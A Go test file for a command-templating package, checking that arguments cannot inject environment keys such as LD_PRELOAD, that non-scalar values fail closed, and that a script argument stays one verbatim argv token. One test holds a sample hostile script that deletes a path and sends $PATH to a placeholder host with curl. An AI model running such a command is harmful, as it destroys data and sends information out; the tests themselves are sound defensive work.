package expressions

import "testing"

// TestRenderEnv_KeysAreNotTemplated proves an arg can fill only an env VALUE
// the author declared — never inject a new env KEY. An LLM therefore cannot
// introduce LD_PRELOAD / PATH / etc. into the child environment via an arg.
func TestRenderEnv_KeysAreNotTemplated(t *testing.T) {
	out, err := RenderEnv(
		map[string]string{"{{ args.k }}": "v"},
		map[string]any{"k": "LD_PRELOAD"},
	)
	if err != nil {
		t.Fatal(err)
	}
	if _, injected := out["LD_PRELOAD"]; injected {
		t.Fatalf("arg value was used as an env key: %v", out)
	}
	if _, ok := out["{{ args.k }}"]; !ok {
		t.Fatalf("env key must be preserved literally, got %v", out)
	}
}

// TestRender_RejectsUnsupportedValueType: a structured (non-scalar) arg value
// fails closed with an error rather than rendering something unexpected or
// panicking — hostile input can't crash or surprise the templater.
func TestRender_RejectsUnsupportedValueType(t *testing.T) {
	if _, err := Render("{{ args.x }}", map[string]any{"x": map[string]any{"n": 1}}); err == nil {
		t.Fatal("expected an error formatting a non-scalar value")
	}
}

// TestRenderArgv_WholeExpressionStaysOneVerbatimToken pins the argv contract
// the `shell.run_script` staging pack relies on: a whole-expression element
// ("{{ args.script }}") renders to exactly ONE argv token holding the value
// verbatim. Shell metacharacters, whitespace, and newlines are data — never
// split into extra tokens — and a "{{ ... }}" sequence inside the value is NOT
// re-expanded. That is what keeps ["-c", "{{ args.script }}"] a single program
// handed to /bin/sh -c rather than a command line assembled from input.
func TestRenderArgv_WholeExpressionStaysOneVerbatimToken(t *testing.T) {
	script := "rm -rf /tmp/x; echo $(whoami) > /tmp/y && curl -fsS http://h/$PATH\n# {{ args.other }} stays literal"

	out, err := RenderArgv(
		[]string{"-c", "{{ args.script }}"},
		map[string]any{"script": script},
	)
	if err != nil {
		t.Fatal(err)
	}
	if len(out) != 2 {
		t.Fatalf("expected 2 argv tokens, got %d: %#v", len(out), out)
	}
	if out[0] != "-c" {
		t.Fatalf("argv[0] = %q, want %q", out[0], "-c")
	}
	if out[1] != script {
		t.Fatalf("script must pass through as one verbatim token.\n got: %q\nwant: %q", out[1], script)
	}
}
